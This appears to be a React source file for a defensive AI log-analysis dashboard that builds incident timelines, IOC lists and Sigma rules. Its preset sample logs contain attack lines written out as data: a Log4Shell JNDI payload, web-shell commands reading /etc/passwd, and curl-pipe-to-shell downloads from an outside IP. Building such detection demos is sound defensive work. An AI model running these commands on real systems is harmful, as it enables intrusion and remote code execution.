/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from "react";
import {
  FileText,
  Clock,
  ShieldAlert,
  AlertTriangle,
  CheckCircle2,
  Copy,
  Check,
  Sparkles,
  Terminal,
  Activity,
  Layers,
  ChevronDown,
  ChevronUp,
  RotateCcw,
  ExternalLink,
  Cpu
} from "lucide-react";

interface TimelineEvent {
  id: string;
  timestamp: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  tactic: string;
  techniqueId: string;
  techniqueName: string;
  source: string;
  message: string;
  raw: string;
}

interface LogAnalysisResult {
  detectedFormat: string;
  totalLines: number;
  riskScore: number;
  riskLevel: "Critical" | "High" | "Medium" | "Low";
  attackNarrative: string;
  rootCause: string;
  timeline: TimelineEvent[];
  extractedIocs: {
    ips: string[];
    users: string[];
    processes: string[];
    totalIocs: number;
  };
  recommendations: string[];
  sigmaRule: string;
}

const PRESET_SCENARIOS = [
  {
    name: "Windows Active Directory Kerberoasting & PrivEsc",
    format: "windows-evtx",
    logs: `2026-09-05 02:14:02 WIN-DC01 Security-Auditing 4625 An account failed to log on. Account Name: svc_sql, Workstation: WKSTN-89, Failure Reason: Unknown user name or bad password, Source Network Address: 192.168.4.112
2026-09-05 02:14:05 WIN-DC01 Security-Auditing 4625 An account failed to log on. Account Name: svc_backup, Workstation: WKSTN-89, Failure Reason: Bad password, Source Network Address: 192.168.4.112
2026-09-05 02:14:12 WIN-DC01 Security-Auditing 4624 An account was successfully logged on. Account Name: administrator, Logon Type: 3 (Network), Source Network Address: 185.112.146.22
2026-09-05 02:15:30 WIN-DC01 Security-Auditing 4688 A new process has been created. Creator Process: C:\\Windows\\System32\\cmd.exe, Process Command Line: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...
2026-09-05 02:16:01 WIN-DC01 Security-Auditing 7045 A service was installed in the system. Service Name: PSSvcMgr, Service File Name: C:\\ProgramData\\updater.exe, Service Type: user mode service
2026-09-05 02:17:40 WIN-DC01 Security-Auditing 4698 A scheduled task was created. Task Name: \\Microsoft\\Windows\\MaintenanceSync, Task Content: C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\payload.dll,Entry`
  },
  {
    name: "Apache Log4Shell & Web Shell Dropper",
    format: "web-access",
    logs: `198.51.100.44 - - [05/Sep/2026:03:12:01 +0000] "GET /login HTTP/1.1" 200 4521 "Mozilla/5.0"
198.51.100.44 - - [05/Sep/2026:03:12:04 +0000] "POST /api/auth HTTP/1.1" 400 125 "$\\{jndi:ldap://185.112.146.22:1389/Exploit\\}" "Mozilla/5.0"
198.51.100.44 - - [05/Sep/2026:03:12:15 +0000] "GET /uploads/shell.jsp?cmd=whoami HTTP/1.1" 200 28 "curl/7.68.0"
198.51.100.44 - - [05/Sep/2026:03:12:22 +0000] "GET /uploads/shell.jsp?cmd=cat%20/etc/passwd HTTP/1.1" 200 1840 "curl/7.68.0"
198.51.100.44 - - [05/Sep/2026:03:12:45 +0000] "GET /uploads/shell.jsp?cmd=curl%20-s%20http://185.112.146.22/miner.sh|bash HTTP/1.1" 200 12 "curl/7.68.0"`
  },
  {
    name: "Linux SSH Brute Force & Sudo Privilege Escalation",
    format: "linux-auth",
    logs: `Sep  5 04:10:12 srv-edge sshd[14221]: Failed password for invalid user admin from 142.11.206.88 port 48122 ssh2
Sep  5 04:10:15 srv-edge sshd[14225]: Failed password for invalid user root from 142.11.206.88 port 48126 ssh2
Sep  5 04:10:19 srv-edge sshd[14229]: Failed password for invalid user test from 142.11.206.88 port 48130 ssh2
Sep  5 04:11:02 srv-edge sshd[14240]: Accepted password for deploy from 142.11.206.88 port 48154 ssh2
Sep  5 04:11:15 srv-edge sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
Sep  5 04:11:32 srv-edge sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c "curl http://185.112.146.22/agent.py | python3"`
  }
];

interface LogAnalyzerProps {
  onPivotToIoc?: (type: "IP" | "Domain", value: string) => void;
}

export default function LogAnalyzerView({ onPivotToIoc }: LogAnalyzerProps) {
  const [logInput, setLogInput] = useState(PRESET_SCENARIOS[0].logs);
  const [selectedFormat, setSelectedFormat] = useState("auto");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState<LogAnalysisResult | null>(null);
  const [severityFilter, setSeverityFilter] = useState<string>("all");
  const [searchFilter, setSearchFilter] = useState("");
  const [expandedEvents, setExpandedEvents] = useState<Record<string, boolean>>({});
  const [copiedRule, setCopiedRule] = useState(false);

  const handleAnalyze = async () => {
    if (!logInput.trim()) {
      setError("Please input or paste log content to analyze.");
      return;
    }
    setLoading(true);
    setError("");

    try {
      const apiKey = localStorage.getItem("GEMINI_API_KEY") || "";
      const res = await fetch("/api/ai/analyze-logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          logs: logInput,
          logFormat: selectedFormat,
          apiKey
        })
      });

      if (!res.ok) {
        throw new Error(`Server returned HTTP ${res.status}`);
      }

      const data = await res.json();
      setResult(data);
    } catch (err: any) {
      setError(err.message || "Log analysis failed. Please verify syntax.");
    } finally {
      setLoading(false);
    }
  };

  const toggleEventExpand = (id: string) => {
    setExpandedEvents(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleCopySigma = () => {
    if (result?.sigmaRule) {
      navigator.clipboard.writeText(result.sigmaRule);
      setCopiedRule(true);
      setTimeout(() => setCopiedRule(false), 2000);
    }
  };

  const filteredTimeline = (result?.timeline || []).filter(e => {
    if (severityFilter !== "all" && e.severity !== severityFilter) return false;
    if (searchFilter) {
      const s = searchFilter.toLowerCase();
      return (
        e.message.toLowerCase().includes(s) ||
        e.techniqueName.toLowerCase().includes(s) ||
        e.techniqueId.toLowerCase().includes(s) ||
        e.raw.toLowerCase().includes(s)
      );
    }
    return true;
  });

  return (
    <div className="space-y-6 animate-fade-in font-sans">
      {/* Header Banner */}
      <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-6 backdrop-blur-md relative overflow-hidden">
        <div className="absolute top-0 right-0 w-80 h-80 bg-red-600/5 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 mb-1.5">
              <div className="p-1.5 rounded bg-red-500/10 border border-red-500/30 text-red-400">
                <FileText className="w-5 h-5" />
              </div>
              <h2 className="text-lg font-mono font-bold tracking-wider text-slate-100 uppercase">
                AI Log Analyzer & Timeline Builder
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-950/60 border border-red-800 text-red-400 font-bold uppercase">
                Multi-Format
              </span>
            </div>
            <p className="text-xs text-slate-400 max-w-3xl leading-relaxed">
              Ingest raw multi-format security logs (Windows EVTX/XML, Linux Syslog, Apache/Nginx, Zeek, AWS CloudTrail). ThreatNexus extracts indicators, maps MITRE ATT&CK tactics, reconstructs the incident chronology, and generates actionable containment steps.
            </p>
          </div>

          {/* Quick Presets */}
          <div className="flex flex-wrap items-center gap-1.5">
            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest mr-1">
              Presets:
            </span>
            {PRESET_SCENARIOS.map((p, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => {
                  setLogInput(p.logs);
                  setSelectedFormat(p.format);
                }}
                className="px-2.5 py-1 text-[11px] font-mono rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white hover:border-slate-700 active:scale-95 transition"
              >
                {p.name.split(" ")[0]} {p.name.split(" ")[1]}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Input Workbench */}
      <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-3 text-xs font-mono">
          <div className="flex items-center gap-2">
            <span className="text-slate-400">Parser Format:</span>
            <select
              value={selectedFormat}
              onChange={e => setSelectedFormat(e.target.value)}
              className="bg-slate-900 border border-slate-800 rounded px-2.5 py-1 text-slate-200 text-xs focus:outline-none focus:border-red-500"
            >
              <option value="auto">Auto-Detect Format</option>
              <option value="windows-evtx">Windows Event Logs (EVTX / XML)</option>
              <option value="linux-auth">Linux Auth & Syslog</option>
              <option value="web-access">Web Access Logs (Apache / Nginx)</option>
              <option value="aws-cloudtrail">AWS CloudTrail Audit</option>
              <option value="zeek-network">Zeek / Bro / Suricata</option>
            </select>
          </div>

          <div className="flex items-center gap-3">
            <span className="text-slate-500 text-[11px]">
              {logInput.split("\n").filter(Boolean).length} lines loaded
            </span>
            <button
              type="button"
              onClick={() => setLogInput("")}
              className="flex items-center gap-1 text-slate-500 hover:text-slate-300 transition"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              Clear
            </button>
          </div>
        </div>

        <div className="relative">
          <textarea
            value={logInput}
            onChange={e => setLogInput(e.target.value)}
            rows={8}
            placeholder="Paste raw log lines or drag-and-drop log text here..."
            className="w-full bg-slate-1000/90 border border-slate-850 rounded p-3.5 font-mono text-xs text-slate-200 focus:outline-none focus:border-red-500/50 leading-relaxed resize-y placeholder:text-slate-600"
          />
        </div>

        {error && (
          <div className="p-3 bg-red-950/40 border border-red-500/30 text-red-300 text-xs font-mono rounded flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-red-500 shrink-0" />
            <span>{error}</span>
          </div>
        )}

        <div className="flex items-center justify-between pt-2">
          <div className="text-[11px] font-mono text-slate-500 flex items-center gap-2">
            <Sparkles className="w-3.5 h-3.5 text-red-400" />
            <span>AI correlation matches MITRE ATT&CK & extracts forensic indicators</span>
          </div>

          <button
            type="button"
            onClick={handleAnalyze}
            disabled={loading}
            className="px-5 py-2.5 rounded bg-red-600 hover:bg-red-500 active:scale-95 text-white font-mono text-xs font-bold uppercase tracking-wider flex items-center gap-2 transition disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40"
          >
            {loading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                Analyzing Stream...
              </>
            ) : (
              <>
                <Terminal className="w-4 h-4" />
                Run Deep Log Analysis
              </>
            )}
          </button>
        </div>
      </div>

      {/* Analysis Results */}
      {result && (
        <div className="space-y-6">
          {/* Metrics Ribbon */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
            <div className="bg-slate-950/80 border border-slate-900 rounded p-4 font-mono">
              <span className="text-[10px] text-slate-500 uppercase tracking-wider block">
                Calculated Risk Score
              </span>
              <div className="flex items-baseline gap-2 mt-1">
                <span className={`text-2xl font-bold ${
                  result.riskScore >= 75 ? "text-red-400" : result.riskScore >= 50 ? "text-orange-400" : "text-emerald-400"
                }`}>
                  {result.riskScore}
                </span>
                <span className="text-xs text-slate-500">/ 100</span>
                <span className={`text-[9px] px-1.5 py-0.5 rounded border uppercase font-bold ml-auto ${
                  result.riskLevel === "Critical" ? "bg-red-950 border-red-900 text-red-400" :
                  result.riskLevel === "High" ? "bg-orange-950 border-orange-900 text-orange-400" :
                  "bg-emerald-950 border-emerald-900 text-emerald-400"
                }`}>
                  {result.riskLevel}
                </span>
              </div>
            </div>

            <div className="bg-slate-950/80 border border-slate-900 rounded p-4 font-mono">
              <span className="text-[10px] text-slate-500 uppercase tracking-wider block">
                Detected Log Format
              </span>
              <span className="text-sm font-bold text-slate-200 mt-2 block uppercase tracking-wide">
                {result.detectedFormat}
              </span>
            </div>

            <div className="bg-slate-950/80 border border-slate-900 rounded p-4 font-mono">
              <span className="text-[10px] text-slate-500 uppercase tracking-wider block">
                Timeline Events
              </span>
              <span className="text-xl font-bold text-slate-200 mt-1 block">
                {result.timeline.length} <span className="text-xs text-slate-500 font-normal">correlated</span>
              </span>
            </div>

            <div className="bg-slate-950/80 border border-slate-900 rounded p-4 font-mono">
              <span className="text-[10px] text-slate-500 uppercase tracking-wider block">
                Extracted IOCs
              </span>
              <span className="text-xl font-bold text-slate-200 mt-1 block">
                {result.extractedIocs.totalIocs} <span className="text-xs text-slate-500 font-normal">entities</span>
              </span>
            </div>
          </div>

          {/* Narrative & Root Cause Card */}
          <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-4">
            <div className="flex items-center gap-2 border-b border-slate-900 pb-3">
              <ShieldAlert className="w-4 h-4 text-red-400" />
              <h3 className="font-mono text-xs font-bold text-slate-100 uppercase tracking-wider">
                Threat Intelligence Synthesis & Root Cause
              </h3>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 text-xs font-mono">
              <div className="bg-slate-900/40 border border-slate-850 p-4 rounded space-y-2">
                <span className="text-[10px] text-red-400 uppercase tracking-wider font-bold">
                  Attack Narrative
                </span>
                <p className="text-slate-300 leading-relaxed">
                  {result.attackNarrative}
                </p>
              </div>

              <div className="bg-slate-900/40 border border-slate-850 p-4 rounded space-y-2">
                <span className="text-[10px] text-orange-400 uppercase tracking-wider font-bold">
                  Root Cause / Initial Ingress Vector
                </span>
                <p className="text-slate-300 leading-relaxed">
                  {result.rootCause}
                </p>
              </div>
            </div>
          </div>

          {/* Extracted IOCs Matrix */}
          {result.extractedIocs.totalIocs > 0 && (
            <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-3 font-mono">
              <div className="flex items-center justify-between border-b border-slate-900 pb-3">
                <div className="flex items-center gap-2">
                  <Activity className="w-4 h-4 text-red-400" />
                  <h3 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                    Extracted Forensic Indicators (IOCs)
                  </h3>
                </div>
                <span className="text-[10px] text-slate-500">
                  Click indicator to pivot
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                {/* IP Addresses */}
                <div className="space-y-2">
                  <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                    IP Addresses ({result.extractedIocs.ips.length})
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {result.extractedIocs.ips.length > 0 ? (
                      result.extractedIocs.ips.map((ip, i) => (
                        <button
                          key={i}
                          type="button"
                          onClick={() => onPivotToIoc && onPivotToIoc("IP", ip)}
                          className="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-slate-200 text-[11px] hover:border-red-500/50 hover:text-white transition flex items-center gap-1.5"
                        >
                          <span>{ip}</span>
                          <ExternalLink className="w-2.5 h-2.5 text-slate-500" />
                        </button>
                      ))
                    ) : (
                      <span className="text-slate-600 text-[11px]">No external IPs</span>
                    )}
                  </div>
                </div>

                {/* User Accounts */}
                <div className="space-y-2">
                  <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                    User Accounts ({result.extractedIocs.users.length})
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {result.extractedIocs.users.length > 0 ? (
                      result.extractedIocs.users.map((u, i) => (
                        <span
                          key={i}
                          className="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-amber-300 text-[11px]"
                        >
                          @{u}
                        </span>
                      ))
                    ) : (
                      <span className="text-slate-600 text-[11px]">No user tokens found</span>
                    )}
                  </div>
                </div>

                {/* Processes */}
                <div className="space-y-2">
                  <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                    Executables & Binaries ({result.extractedIocs.processes.length})
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {result.extractedIocs.processes.length > 0 ? (
                      result.extractedIocs.processes.map((proc, i) => (
                        <span
                          key={i}
                          className="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-red-300 text-[11px] truncate max-w-full"
                          title={proc}
                        >
                          {proc}
                        </span>
                      ))
                    ) : (
                      <span className="text-slate-600 text-[11px]">None recorded</span>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Interactive Visual Incident Timeline */}
          <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-4 font-mono">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-900 pb-3">
              <div className="flex items-center gap-2">
                <Clock className="w-4 h-4 text-red-400" />
                <h3 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                  Reconstructed Incident Timeline
                </h3>
              </div>

              {/* Filters */}
              <div className="flex flex-wrap items-center gap-2">
                <input
                  type="text"
                  value={searchFilter}
                  onChange={e => setSearchFilter(e.target.value)}
                  placeholder="Filter events..."
                  className="px-2.5 py-1 text-xs bg-slate-900 border border-slate-800 rounded text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-red-500"
                />
                <select
                  value={severityFilter}
                  onChange={e => setSeverityFilter(e.target.value)}
                  className="px-2.5 py-1 text-xs bg-slate-900 border border-slate-800 rounded text-slate-200 focus:outline-none focus:border-red-500"
                >
                  <option value="all">All Severities</option>
                  <option value="critical">Critical</option>
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
              </div>
            </div>

            {/* Timeline Stream */}
            <div className="space-y-3 relative before:absolute before:left-3 before:top-2 before:bottom-2 before:w-0.5 before:bg-slate-900">
              {filteredTimeline.map((item) => {
                const isExpanded = expandedEvents[item.id];
                const badgeColor =
                  item.severity === "critical"
                    ? "bg-red-950 border-red-800 text-red-400"
                    : item.severity === "high"
                    ? "bg-orange-950 border-orange-800 text-orange-400"
                    : item.severity === "medium"
                    ? "bg-amber-950 border-amber-800 text-amber-400"
                    : "bg-slate-900 border-slate-800 text-slate-400";

                const dotColor =
                  item.severity === "critical"
                    ? "bg-red-500 ring-red-950"
                    : item.severity === "high"
                    ? "bg-orange-500 ring-orange-950"
                    : item.severity === "medium"
                    ? "bg-amber-500 ring-amber-950"
                    : "bg-slate-500 ring-slate-900";

                return (
                  <div key={item.id} className="relative pl-8 group">
                    {/* Time dot */}
                    <div
                      className={`absolute left-2 top-3 w-2.5 h-2.5 rounded-full ring-4 ${dotColor} transition-transform group-hover:scale-125`}
                    />

                    <div className="bg-slate-900/40 border border-slate-850 hover:border-slate-800 rounded p-3.5 transition space-y-2">
                      <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-slate-500 font-bold">
                            {item.timestamp}
                          </span>
                          <span className={`text-[9px] px-1.5 py-0.5 rounded border uppercase font-bold ${badgeColor}`}>
                            {item.severity}
                          </span>
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-950 border border-slate-900 text-slate-400">
                            {item.tactic}
                          </span>
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-red-950/20 border border-red-900/40 text-red-300">
                            {item.techniqueId} {item.techniqueName}
                          </span>
                        </div>

                        <button
                          type="button"
                          onClick={() => toggleEventExpand(item.id)}
                          className="text-slate-500 hover:text-slate-300 text-[11px] flex items-center gap-1 transition"
                        >
                          {isExpanded ? (
                            <>
                              <ChevronUp className="w-3.5 h-3.5" /> Collapse
                            </>
                          ) : (
                            <>
                              <ChevronDown className="w-3.5 h-3.5" /> Raw Log
                            </>
                          )}
                        </button>
                      </div>

                      <p className="text-slate-200 text-xs font-semibold">
                        {item.message}
                      </p>

                      {isExpanded && (
                        <div className="mt-2 p-2.5 bg-slate-1000 border border-slate-900 rounded text-[11px] text-slate-400 font-mono break-all select-all">
                          {item.raw}
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Containment Playbook & Sigma Rule */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 font-mono text-xs">
            {/* Recommendations */}
            <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-3">
              <div className="flex items-center gap-2 border-b border-slate-900 pb-3">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <h3 className="font-bold text-slate-100 uppercase tracking-wider">
                  Immediate Containment Actions
                </h3>
              </div>

              <ul className="space-y-2.5">
                {result.recommendations.map((rec, i) => (
                  <li key={i} className="flex items-start gap-2.5 text-slate-300">
                    <span className="text-red-400 font-bold shrink-0">0{i + 1}.</span>
                    <span>{rec}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Generated Sigma Rule */}
            <div className="bg-slate-950/80 border border-slate-900 rounded-lg p-5 backdrop-blur-md space-y-3">
              <div className="flex items-center justify-between border-b border-slate-900 pb-3">
                <div className="flex items-center gap-2">
                  <Layers className="w-4 h-4 text-red-400" />
                  <h3 className="font-bold text-slate-100 uppercase tracking-wider">
                    Generated Sigma Rule
                  </h3>
                </div>

                <button
                  type="button"
                  onClick={handleCopySigma}
                  className="flex items-center gap-1 text-[11px] text-slate-400 hover:text-white transition"
                >
                  {copiedRule ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                      <span className="text-emerald-400">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>Copy Rule</span>
                    </>
                  )}
                </button>
              </div>

              <pre className="p-3 bg-slate-1000 border border-slate-850 rounded text-[11px] text-emerald-400 overflow-x-auto leading-relaxed max-h-48">
                {result.sigmaRule}
              </pre>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
